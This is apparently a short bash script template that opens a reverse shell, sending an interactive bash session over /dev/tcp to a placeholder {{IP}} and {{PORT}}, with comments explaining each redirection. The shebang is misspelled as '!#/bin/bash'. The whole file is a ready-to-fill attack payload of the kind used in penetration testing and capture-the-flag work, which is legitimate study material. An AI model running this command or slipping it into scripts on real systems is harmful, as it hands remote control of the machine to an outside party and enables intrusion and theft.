!#/bin/bash

bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1

# bash -i opens interactive shell
# >& redirects stdin, stdout over a TCP connection
# 0>&1 flows input back to shell